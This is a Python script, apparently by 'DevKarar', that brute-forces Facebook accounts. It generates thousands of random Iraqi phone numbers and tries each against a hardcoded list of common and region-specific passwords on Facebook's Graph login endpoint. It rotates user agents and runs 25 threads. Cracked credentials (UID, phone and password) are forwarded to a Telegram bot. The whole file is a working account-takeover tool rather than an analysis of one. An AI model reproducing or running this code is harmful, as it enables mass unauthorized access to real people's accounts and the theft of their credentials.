#DevKarar Source 
import os
import random, requests, urllib, urllib.request, re, json, time, string, sys
from concurrent.futures import ThreadPoolExecutor
from time import sleep
import user_agent
from cfonts import render
Login=render('Karar',colors=['red','green'], align='center')
id = []
def print_x(lp):print(lp)
OSNAME = os.name
user_agents = [
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 13; SM-G991B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/420.0.0.33.113;FBBV/839876087;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/samsung;FBBD/samsung;FBDV/SM-G991B;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2340};FB_FW/1;]',
    'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 5 Build/SQ3A.220705.004) [FBAN/Orca-Android;FBAV/419.0.0.37.71;FBBV/838462970;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/Google;FBBD/google;FBDV/Pixel 5;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2340};FB_FW/1;]',
    'Dalvik/2.1.0 (Linux; U; Android 14; OnePlus 11 Build/UKQ1.230924.003) [FBAN/Orca-Android;FBAV/421.0.0.29.114;FBBV/841203456;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/OnePlus;FBBD/OnePlus;FBDV/OnePlus 11;FBSV/14;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1440,height=3216};FB_FW/1;]',
    'Dalvik/2.1.0 (Linux; U; Android 11; Mi 11 Build/RKQ1.200826.002) [FBAN/Orca-Android;FBAV/418.0.0.32.199;FBBV/836503242;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Mi 11;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;]',
    'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; HUAWEI P30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1'
]

def get_random_user_agent():
    return random.choice(user_agents)

def make_generate_number():
    rer = random.randint
    for _ in range(int(random.choice(['20000','25000','30000']))):
        num = rer(0000000, 9999999)
        nums=str(''.join(random.choice(string.digits)for w in range(7)))
        id .append(str(nums))

def send_telegram(bot_token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except:
        return False

class appollooop_DevKararBest:
    hits=0
    def __init__(self):
        self.bot_token = ""
        self.chat_id = ""
        self.telegram_enabled = False
        
    def main_menu(self):
        self.ok=0
        self.cp=0
        self.urlloginappollo='https://b-graph.facebook.com/auth/login'
        self.loop=0
        self.setup_telegram()
        self.crack()
        
    def setup_telegram(self):
        os.system('cls' if OSNAME != 'posix' else 'clear')
        print_x(Login)
        print_x('')
        print_x('\033[1;33m\033[1mDeveloper: DevKarar')
        print_x('\033[1;36m\033[1mTelegram: @VIPKR0')
        print_x('\033[1;37m\033[1m-'*45)
        print_x('\033[1;32m\033[1mTelegram Bot Setup (Optional)')
        print_x('\033[1;37m\033[1m-'*45)
        
        setup_choice = input('\033[1;33m\033[1mDo you want to setup Telegram notifications? (y/n): ')
        
        if setup_choice.lower() == 'y':
            self.bot_token = input('\033[1;33m\033[1mEnter Bot Token: ')
            self.chat_id = input('\033[1;33m\033[1mEnter Chat ID: ')
            
            if self.bot_token and self.chat_id:
                #$#
                test_message = "🚀 <b>DevKarar Tool Started</b>\n📱 Bot connected successfully!"
                if send_telegram(self.bot_token, self.chat_id, test_message):
                    print_x('\033[1;32m\033[1m✓ Telegram bot connected successfully!')
                    self.telegram_enabled = True
                else:
                    print_x('\033[1;31m\033[1m✗ Failed to connect to Telegram bot')
                    self.telegram_enabled = False
            else:
                print_x('\033[1;31m\033[1m✗ Invalid token or chat ID')
                self.telegram_enabled = False
        else:
            print_x('\033[1;33m\033[1mSkipping Telegram setup...')
            self.telegram_enabled = False
        
        time.sleep(2)

    def send_result_to_telegram(self, result_type, uid, password, phone, current_code):
        if not self.telegram_enabled:
            return
            
        try:
            if result_type == "OK":
                message = f"✅ <b>SUCCESS FOUND!</b>\n"
                message += f"👤 <b>UID:</b> <code>{uid}</code>\n"
                message += f"📱 <b>Phone:</b> <code>{phone}</code>\n"
                message += f"🔑 <b>Password:</b> <code>{password}</code>\n"
                message += f"📡 <b>Code:</b> <code>{current_code}</code>\n"
                message += f"🎯 <b>Status:</b> <code>LIVE ACCOUNT</code>\n"
                message += f"⚡ <b>By:</b> @VIPKR0"
            else:
                message = f"⚠️ <b>CHECKPOINT FOUND</b>\n"
                message += f"👤 <b>UID:</b> <code>{uid}</code>\n"
                message += f"📱 <b>Phone:</b> <code>{phone}</code>\n"
                message += f"🔑 <b>Password:</b> <code>{password}</code>\n"
                message += f"📡 <b>Code:</b> <code>{current_code}</code>\n"
                message += f"🎯 <b>Status:</b> <code>CHECKPOINT</code>\n"
                message += f"⚡ <b>By:</b> @VIPKR0"
                
            send_telegram(self.bot_token, self.chat_id, message)
        except:
            pass

    def Responses(self,response):
        if 'session_key' in response:
            return True
        elif 'www.facebook.com' in response['error']['message']:
            return False

    def Headers(self):
        return {
            'user-agent': get_random_user_agent(),
            'Host':'graph.facebook.com',
            'Content-Type':'application/json;charset=utf-8',
            'Content-Length':'595',
            'Connection':'Keep-Alive',
            'Accept-Encoding':'gzip'
        }

    def Data(self,idf,pw):
        return {
            "locale": "en_GB",
            "format": "json",
            "email":idf,
            "password": pw,
            "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
            "generate_session_cookies": 1
        }

    def crack(self):
        os.system('cls' if OSNAME != 'posix' else 'clear')
        print_x(Login)
        print_x('')
        print_x('\033[1;33m\033[1mDeveloper: DevKarar')
        print_x('\033[1;36m\033[1mTelegram: @VIPKR0')
        print_x('\033[1;37m\033[1m-'*45)

        
        print_x('\033[1;32m\033[1mAvailable Codes to Check:')
        codes_list = ["0770", "0780", "0750", "0771", "0777", "0772", "0773", "0774", "0778"]
        for i, code in enumerate(codes_list, 1):
            print_x(f'\033[1;33m\033[1m[{i}] {code}')
        print_x('\033[1;34m\033[1m[0] Check All Codes')
        print_x('\033[1;37m\033[1m-'*45)

        choice = input('\033[1;33m\033[1mChoose option (0 for all, 1-9 for specific): ')

        if choice == '0':
            self.codes = codes_list
            print_x('\033[1;32m\033[1mSelected: All Codes')
        elif choice.isdigit() and 1 <= int(choice) <= len(codes_list):
            self.codes = [codes_list[int(choice)-1]]
            print_x(f'\033[1;32m\033[1mSelected: {codes_list[int(choice)-1]}')
        else:
            print_x('\033[1;31m\033[1mInvalid choice! Using all codes...')
            self.codes = codes_list

        make_generate_number()
        
        
        if self.telegram_enabled:
            start_message = f"🚀 <b>DevKarar Tool Started</b>\n"
            start_message += f"📡 <b>Codes:</b> <code>{', '.join(self.codes)}</code>\n"
            start_message += f"🎯 <b>Numbers:</b> <code>{len(id)}</code>\n"
            start_message += f"⏰ <b>Time:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>"
            send_telegram(self.bot_token, self.chat_id, start_message)
        
        self.run()

    def run(self):
        with ThreadPoolExecutor(max_workers=25) as devkararteam:
            print_x('\033[1;37m\033[1m-'*45)
            print_x(f'\033[1;36m\033[1mChecking Codes: {", ".join(self.codes)}')
            print_x(f'\033[1;35m\033[1mTelegram: {"✓ Enabled" if self.telegram_enabled else "✗ Disabled"}')
            print_x('\033[1;37m\033[1m-'*45)
            for code in self.codes:
                for ids in id:
                    idf = code + str(ids)
                    
                    Pwx=[
                    
                    code+str(ids), str(ids), "2010", "first last", "qqwweerr", "20092009", 
                    "mmnnbbvvccxxzz", "11223344@@", "11223344@@", "1122334455@@", "12345@12345", 
                    "1234512345@@", "07700770",
                  
                    "123456", "123456789", "12345", "1234", "12345678", "111111", "1234567890",
                    "000000", "666666", "888888", "999999", "555555", "777777", "333333",
                    "654321", "987654321", "147258369", "159753", "741852", "963852",
                    
                    "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009",
                    "2011", "2012", "2013", "2014", "2015", "2016", "2017", "2018", "2019", "2020",
                    "2021", "2022", "2023", "2024", "1990", "1991", "1992", "1993", "1994", "1995",
                    "1996", "1997", "1998", "1999", "19901990", "20002000", "20102010", "20202020",
                    
                    "ahmed", "mohammed", "ali", "omar", "hassan", "hussein", "fatima", "aisha",
                    "sara", "maryam", "noor", "layla", "zainab", "khadija", "yasmin", "rania",
                    "khalid", "abdullah", "ibrahim", "youssef", "mustafa", "abdulrahman",
                   
                    "password", "admin", "user", "login", "welcome", "guest", "test", "demo",
                    "qwerty", "abc123", "password123", "admin123", "user123", "welcome123",
              
                    "qwertyuiop", "asdfghjkl", "zxcvbnm", "qwerty123", "asdf1234", "zxcv1234",
                    "1qaz2wsx", "1q2w3e4r", "qazwsx", "wsxedc", "edcrfv", "rfvtgb",
           
                    "123abc", "abc123", "a123456", "1a2b3c", "aa123456", "1234abcd", "abcd1234",
                    "password1", "password2", "pass123", "pass1234", "mypassword", "newpassword",
                    
                    "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999", "0000",
                    "11111111", "22222222", "33333333", "44444444", "55555555", "66666666",
                    "77777777", "88888888", "99999999", "00000000",
                    
                    "abcdef", "abcd1234", "1234abcd", "a1b2c3", "abc1234", "123abc456",
                    "aaaaa", "bbbbb", "ccccc", "aaaabbbb", "aaaaaa", "bbbbbb",
                    
                    "habibti", "habibi", "azizi", "khalas", "yalla", "inshallah", "mashallah",
                    "alhamdulillah", "subhanallah", "allahu", "akbar", "bismillah", "wallahi",
                    
                    "baghdad", "basra", "kurdistan", "erbil", "sulaymaniyah", "duhok", "kirkuk",
                    "iraq", "kurdish", "kurd", "peshmerga", "salam", "sabah", "masa",
                    
                    "123@123", "abc@123", "pass@123", "admin@123", "user@123", "test@123",
                    "1234@1234", "12345@", "@12345", "123#123", "abc#123", "pass#123",
                    "123$123", "abc$123", "pass$123", "123%123", "abc%123", "pass%123",
                    
                    "love123", "life123", "family123", "heart123", "smile123", "happy123",
                    "peace123", "friend123", "hope123", "dream123", "star123", "moon123",
                    
                    "a1s2d3", "q1w2e3", "1a2s3d", "1q2w3e", "as12df", "qw12er", "za12xs",
                    "12as34", "12qw34", "12za34", "qwer1234", "asdf1234", "zxcv1234",
                   
                    "01011990", "01012000", "01012010", "15051995", "20122000", "31121999",
                    "01/01/1990", "01/01/2000", "15/05/1995", "20/12/2000", "31/12/1999",
                    
                    "123qwe", "qwe123", "123asd", "asd123", "123zxc", "zxc123", "456qwe",
                    "qwe456", "789qwe", "qwe789", "147qwe", "qwe147", "258qwe", "qwe258",
                    
                    "master", "shadow", "dragon", "tiger", "eagle", "falcon", "lion", "wolf",
                    "king", "prince", "princess", "queen", "champion", "winner", "power",
                    "strong", "brave", "smart", "cool", "awesome", "super", "hero", "legend",

                    "07701234567", "07801234567", "07501234567", "07711234567", "07771234567",
                    "07721234567", "07731234567", "07741234567", "07781234567",
                    code, code+"123", code+"321", code+"111", code+"000", code+"456",
      
                    "102030", "111213", "121314", "131415", "141516", "151617", "161718",
                    "171819", "181920", "192021", "202122", "212223", "222324", "232425"
                    ]
                    devkararteam.submit(self.cracked, idf, Pwx, code)
            print_x("")
            print_x('\033[1;37m\033[1m-'*45)
            print_x('\033[1;37m\033[1mCracked Completed By DevKarar')
            
            
            if self.telegram_enabled:
                end_message = f"✅ <b>DevKarar Tool Completed</b>\n"
                end_message += f"🎯 <b>Total OK:</b> <code>{self.ok}</code>\n"
                end_message += f"⚠️ <b>Total CP:</b> <code>{self.cp}</code>\n"
                end_message += f"📊 <b>Total Checked:</b> <code>{self.loop}</code>\n"
                end_message += f"⏰ <b>Finished:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
                end_message += f"🚀 <b>By:</b> @VIPKR0"
                send_telegram(self.bot_token, self.chat_id, end_message)
            
            exit()

    def cracked(self, idf, Pwx, current_code):
        try:
            sys.stdout.write(f"\r\r\r\033[1;37m\033[1m[{current_code}] {self.loop} | {str(len(id))} | OK:-{self.ok} | CP:-{self.cp} "),
            sys.stdout.flush()
            for pw in Pwx:
                headers=self.Headers() 
                data=self.Data(idf,pw)

                response=requests.post(self.urlloginappollo,headers=headers,data=data,allow_redirects=False).json()     
                
                if self.Responses(response) == True:  
                    uids=response['uid']  
                    print_x(f"\r\r\033[0;32m\033[1mDevKarar[OK] {uids} | {pw} | Code: {current_code}          ")  
                    self.ok+=1
                    
                    self.send_result_to_telegram("OK", uids, pw, idf, current_code)
                elif self.Responses(response) == False:  
                    uids=response['error']['error_data']['uid']  
                    print_x(f"\r\r\033[1;33m\033[1mDevKarar[CP] {uids} | {pw} | Code: {current_code}          ")  
                    self.cp+=1
                    
                    self.send_result_to_telegram("CP", uids, pw, idf, current_code)
                else:   
                    pass  
                
            self.loop+=1
            
            
            time.sleep(random.uniform(0.5, 2.0))
        except Exception as e:  
            pass

XXX = appollooop_DevKararBest()
XXX.main_menu()
